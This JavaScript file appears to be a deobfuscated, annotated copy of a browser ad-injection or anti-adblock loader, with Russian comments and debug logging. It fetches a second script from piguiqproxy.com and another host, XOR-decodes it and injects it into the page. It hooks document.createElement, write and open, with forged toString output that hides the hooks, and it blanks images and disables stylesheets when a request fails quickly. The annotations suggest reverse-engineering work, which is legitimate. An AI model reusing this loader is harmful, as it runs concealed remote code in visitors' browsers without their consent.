(function () {
    function paramsObjectFactory() {
        var paramsObject = {};
        for (var a = 0; a < arguments.length; a += 2) {
            paramsObject[arguments[a]] = arguments[a + 1]
        }

        return paramsObject
    }
    function main() {
        function first_faker() {
            var d = DOCUMENT.getElementsByTagName("IMG");
            var c = 0;
            for (var f = 0; f < d.length; f++) {
                if (d[f].src && d[f]["src"] != "") {
                    d[f].src = "";
                    c++
                }
            }

            return c
        }

        function disableDocumentStyles() {
            var documentStyles = DOCUMENT.styleSheets;
            for (var c = 0; c < documentStyles.length; c++) {
                documentStyles[c].disabled = true
            }

            first_faker();
            WINDOW.stop()
        }

        function replace_domElement_method(domElement, elementMethod, newMethod) {

            function to_string_mascarading() {
                return original_element_method_source
            }

            var original_element_method_source = domElement[elementMethod].toString();

            newMethod._orig = domElement[elementMethod].bind(domElement);
            domElement[elementMethod] = newMethod;
            domElement[elementMethod].toString = to_string_mascarading
        }

        function disableStylesBySlowPerformance(c) {
            var b = WINDOW.performance.now() - c.start;
            if (b < intValue300) {
                disableDocumentStyles()
            }
        }

        function w(d, b, f) {
            WINDOW.Object.defineProperty(d, b, paramsObjectFactory("enumerable", false, "configurable", false, "writable", false, "value", f))
        }

        function addAndRemoveScriptElement(b) {
            b = create_SelfExecutable_Script_With_Application_Tag(b);
            var elScript = DOCUMENT.createElement("script");
            elScript.async = false;
            elScript.textContent = b;
            window.secondScript = b;
//                    elScript.src = "secondScript.js";
//            debugger
            DOCUMENT.documentElement.appendChild(elScript);
                    DOCUMENT.documentElement.removeChild(elScript)
        }

        function create_SelfExecutable_Script_With_Application_Tag(b) {
            //debugger
            var c = "mzs__" + WINDOW.Math.random().toString().substr(2, 4);
            WINDOW[c] = stateData;
            b = "(function(mz_str) { debugger; " + b + "})('" + c + "');";
            return b
        }
        function ajaxGetUri(ajaxUri, callbackFunction) {
            function onLoad() {
                callbackFunction(ajaxRequest)
            }
            function onError() {
                disableStylesBySlowPerformance(ajaxRequest)
            }
            window.logs(ajaxUri)
            //      new window.XMLHttpRequest()
            var ajaxRequest = new WINDOW.XMLHttpRequest();
            // .open('GET', )
            ajaxRequest.open("GET", ajaxUri, true);
            // .responseType = 'text'
            ajaxRequest.responseType = "text";
            // .start = window.performance.now()
            ajaxRequest.start = WINDOW.performance.now();
            if (!main) {
                main = "bind" //bind
            }

            // addEventListener
            ajaxRequest.addEventListener("load", onLoad);
            // addEventListener
            ajaxRequest.addEventListener("error", onError);
            // .send(null)
            ajaxRequest.send(null)
        }
        function recode_encodedDict_in_loaded_script(scriptSource) {
            //debugger
            /**
             * .match Ищет закодированный словарь и возвращает его в виде массива из двух элементов
             **/

            var script_Encripted_Dictionary = scriptSource.match(new WINDOW.RegExp('var _a=\\["(.+)"\\];'));
//                    var m = scriptSource.match(new WINDOW.RegExp(dict[43]));
//                    var m = scriptSource.match(new WINDOW.RegExp("var _a=\["(.+)"\];"));
            if (script_Encripted_Dictionary) {
                /**
                 * Из строки(второго элемента полученного массива) делаем нормальный массив с закодированными словами
                 */
                var n = script_Encripted_Dictionary[1];
                var s = n.split('","');
                var o = "", concatenated_encoded_elements = dict[4], v = 0, c = [];

                /**
                 * Ищим вхождение "магоической херни" - МХ. На момент дебага её индекс был 172
                 * Все слова до МХ, склеиваются в одну строку без разделителей
                 */
                while (s[v] != "bf4bfd3ad268f00b1ac6fc8a32a5309a") {

                    concatenated_encoded_elements += s[v];

                    if (++v == s.length) {
                        return
                    }
                }

                /**
                 * Бежим по элементам массива, следующим за МХ
                 */
                for (var g = v + 1; g < s.length; g++) {
                    var encoded_word_after_MX = s[g], h = g - v - 1;

                    var chars_to_recode = concatenated_encoded_elements.substr(h * 2, 2);

                    var power_for_recoding_intChar_of_encoded_word_after_MX = WINDOW.parseInt(chars_to_recode, 16), chars_to_recode_as_int_copy = power_for_recoding_intChar_of_encoded_word_after_MX;

                    var recoded_word_after_MX = "";

                    for (var i = 0; i < encoded_word_after_MX.length; i += 2) {
                        var intChar_of_encoded_word_after_MX = WINDOW.parseInt(encoded_word_after_MX.substr(i, 2), 16);

                        var recoded_char_of_encoded_word_after_MX = intChar_of_encoded_word_after_MX ^ power_for_recoding_intChar_of_encoded_word_after_MX;

                        power_for_recoding_intChar_of_encoded_word_after_MX = recoded_char_of_encoded_word_after_MX ^ chars_to_recode_as_int_copy;

                        recoded_char_of_encoded_word_after_MX = recoded_char_of_encoded_word_after_MX.toString(16);

                        if (recoded_char_of_encoded_word_after_MX.length < 2) {

                            recoded_char_of_encoded_word_after_MX = "0" + recoded_char_of_encoded_word_after_MX

                        }

                        recoded_word_after_MX += recoded_char_of_encoded_word_after_MX
                    }

                    c.push(recoded_word_after_MX)
                }

                scriptSource = scriptSource.replace(n, c.join('","'))
            }

            return scriptSource
        }

        function hack_documents_methods(g) {
            function new_document_create_element(f) {
                function iframe_onload_listener(b) {
                    debugger
                    var f = b.target;
                    var g = null;
                    try {
                        g = f.contentWindow.document
                    } catch (e) {
                    }

                    if (g) {
                        hack_documents_methods(g);
                        new_element.removeEventListener("load", iframe_onload_listener)
                    }
                }
                // hack_documents_methods
                //debugger

                var original_create_element = arguments.callee._orig;
                var new_element = original_create_element.apply(this, arguments);

                if (new_element.tagName == "IFRAME") {
                    new_element.addEventListener("load", iframe_onload_listener)
                }
                return new_element
            }

            function new_document_write() {
                debugger
                var c = arguments.callee._orig;
                var d = this.readyState;

                c.apply(this, arguments);

                if (d == "complete") {
                    add_Error_and_Load_Listeners(this)
                }
            }

            function new_document_open() {
                debugger
                var b = arguments.callee._orig;
                b.apply(this, arguments);
                add_Error_and_Load_Listeners(this)
            }

            replace_domElement_method(g, "createElement", new_document_create_element);
            var h = new_document_write;
            replace_domElement_method(g, "write", h);
            replace_domElement_method(g, "writeln", h);
            replace_domElement_method(g, "open", new_document_open);
            stateData.docs.push(g);
            add_Error_and_Load_Listeners(g)
        }

        function eventListener_error_load(event, isError) {
            var event_target = event.target;
            var targets_stack = (isError) ? stateData.er_load : stateData.sc_load;
            try {
                window.logs({isError: isError, target: event_target.src || event_target.textContent || event_target.href})
            } catch (e){}
            targets_stack.push(event_target)
        }

        function add_Error_and_Load_Listeners(domElement) {
            domElement.addEventListener("error", stateData.er_listen, true);
            domElement.addEventListener("load", stateData.sc_listen, true)
        }

        function loadSecondScript() {
            function secondScriptRecieved(ajaxResponse) {
                function secondScriptCallback(b) {
                    //debugger
                    addAndRemoveScriptElement(recode_encodedDict_in_loaded_script(b.responseText))
                }
                if (ajaxResponse.status == 204) { // status
                    if (queryParamsObject.r) {
                        // console.log("arg load fail, 204")
                        WINDOW.console.log("arg load fail, 204");
                        return
                    }

                    queryParamsObject.r = DOCUMENT.location.href;
                    ajaxGetUri(makeQueryUri(), secondScriptRecieved);
                    return
                }

                stateData.vars.session = ajaxResponse.getResponseHeader("X-Meta-Request-Id");
                var ajaxHeaderXLocation = ajaxResponse.getResponseHeader("X-Location");

                if (!stateData.vars.session || !ajaxHeaderXLocation) {
                    return
                };
                // debugger; // now we will request for second script
                stateData.vars.proxy_host = ( new WINDOW.URL(ajaxHeaderXLocation)).host;

                var h = stateData.vars.proxy_host.indexOf("-");
                if (h > 0) {
                    stateData.vars.proxy_host = stateData.vars.proxy_host.substr(h + 1)
                }

                ajaxGetUri("https://sinoptik.ua/rc/ui/rc1/secondScript.js", secondScriptCallback)
                //ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
            }
            function makeQueryUri() {
                var queryParamsArray = [];
                for (queryParamName in queryParamsObject) {
                    // queryParamsArray.push(queryParamName + "=" + window.encodeURIComponent(queryParamsObject[queryParamName]))
                    queryParamsArray.push(queryParamName + "=" + WINDOW.encodeURIComponent(queryParamsObject[queryParamName]))
                }

                //       queryParamsArray.length ? "?" + queryParamsArray.join("&") : ""
                var queryString = (queryParamsArray.length) ? "?" + queryParamsArray.join("&") : "";
                //     document.location.protocol + '//' + proxyApiUrl + queryString
                return DOCUMENT.location.protocol + "//" + proxyApiUrl + queryString
            }

            var queryParamsObject = {};
            // document.cookie.indexOf('argon_enabled=1') != -1

            if (DOCUMENT.cookie.indexOf("argon_enable=1") != -1) {
                queryParamsObject.w = "1" // b['w'] = 1
            }

            //debugger;
//                    var scr = document.querySelectorAll('script')[1].innerText
//                    var decripted = decriptor(dict, 'dict', scr)
            ajaxGetUri(makeQueryUri(), secondScriptRecieved)
//                    ajaxGetUri("https://recreativ.ru/tizers.php?bn=WETPNH5v46", secondScriptRecieved)
        }
        function er_listen(event) {
            eventListener_error_load(event, true)
        }
        function sc_listen(event) {
            eventListener_error_load(event, false)
        }

        window.logs = function(){
            console.log(JSON.stringify(arguments, null, 2))
        }


        var WINDOW = window, DOCUMENT = WINDOW.document, intValue300 = 300, intValue7 = 7,
            magicWord_tttZZZ2m = "tttZZZ2m", magicWord_f4FFv = "f4FFv";
        var stateData = {};
        var proxyApiUrl = "piguiqproxy.com/api";
        var t = false;
        var C = false;
        var B = null;
        try {
            if (WINDOW.opener && WINDOW.opener["_" + magicWord_tttZZZ2m] == "f4FFv") {
                WINDOW.opener["_" + magicWord_tttZZZ2m] = "";
                t = true
            }
        } catch (e) {
        }

        stateData.er_load = []; // stack of error event targets
        stateData.sc_load = []; // stack of load event targets

        stateData.docs = []; // stack of documents - root and iframe

        stateData.vars = paramsObjectFactory("proxy_host", "", "session", dict[4]); // x['vars'] =
        stateData.dloaded = false; // x['dloaded'] ? document loaded

        window.logs('stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT)')
        stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT); // x['cr_el'] = document[createElement][bind](document)
        stateData.er_listen = er_listen; // x['er_listen']
        stateData.sc_listen = sc_listen // x['sc_listen']

        window.logs('loadSecondScript()')
        loadSecondScript()

        window.logs('hack_documents_methods(DOCUMENT)')
        hack_documents_methods(DOCUMENT);

        if (t) { // always false
            debugger
            DOCUMENT.writeln("<NOFRAMES>");
            DOCUMENT.close()
        }
    }
    var encodedDictionary = [
        "494d47",
        "676574456c656d656e747342795461674e616d65",
        "6c656e677468",
        "737263",
        "",
        "7374796c65536865657473",
        "64697361626c6564",
        "73746f70",
        "746f537472696e67",
        "5f6f726967",
        "62696e64",
        "6e6f77",
        "706572666f726d616e6365",
        "7374617274",
        "656e756d657261626c65",
        "636f6e666967757261626c65",
        "7772697461626c65",
        "76616c7565",
        "646566696e6550726f7065727479",
        "4f626a656374",
        "736372697074",
        "637265617465456c656d656e74", "6173796e63", "74657874436f6e74656e74", "617070656e644368696c64", "646f63756d656e74456c656d656e74", "72656d6f76654368696c64", "6d7a735f5f", "737562737472", "72616e646f6d", "4d617468", "2866756e6374696f6e286d7a5f73747229207b", "7d292827", "27293b", "584d4c4874747052657175657374", "474554", "6f70656e", "726573706f6e736554797065", "74657874", "6c6f6164", "6164644576656e744c697374656e6572", "6572726f72", "73656e64", "766172205f613d5c5b22282e2b29225c5d3b", "526567457870", "6d61746368", "222c22", "73706c6974", "6266346266643361643236386630306231616336666338613332613533303961", "7061727365496e74", "30", "70757368", "6a6f696e", "7265706c616365", "646f63756d656e74", "7474745a5a5a326d", "6634464676", "70696775697170726f78792e636f6d2f617069", "6f70656e6572", "5f", "63616c6c6565", "6170706c79", "7461674e616d65", "494652414d45", "746172676574", "636f6e74656e7457696e646f77", "72656d6f76654576656e744c697374656e6572", "72656164795374617465", "636f6d706c657465", "7772697465", "77726974656c6e", "646f6373", "65725f6c6f6164", "73635f6c6f6164", "65725f6c697374656e", "73635f6c697374656e", "737461747573", "72", "617267206c6f6164206661696c2c20323034", "6c6f67", "636f6e736f6c65", "68726566", "6c6f636174696f6e", "73657373696f6e", "76617273", "582d4d6574612d526571756573742d4964", "676574526573706f6e7365486561646572", "582d4c6f636174696f6e", "70726f78795f686f7374", "686f7374", "55524c", "2d", "696e6465784f66", "726573706f6e736554657874", "3d", "656e636f6465555249436f6d706f6e656e74", "3f", "26", "70726f746f636f6c", "2f2f", "6172676f6e5f656e61626c653d31", "636f6f6b6965", "77", "31", "646c6f61646564", "63725f656c", "3c4e4f", "465241", "4d45533e",
        "636c6f7365"];
    var dictWord, dictChar, dict = [];
    /**
     *  Decode Dictionary
     **/
    for (dictWord = 0; dictWord < encodedDictionary.length; dictWord++)
        for (dict[dictWord] = "", dictChar = 0; dictChar < encodedDictionary[dictWord].length; dictChar += 2)
            dict[dictWord] += String.fromCharCode(parseInt(encodedDictionary[dictWord].substr(dictChar, 2), 16));

    (main)()
})()
    /*21f5420b732442dfa1a830193ed3eb14da8b38a6*/
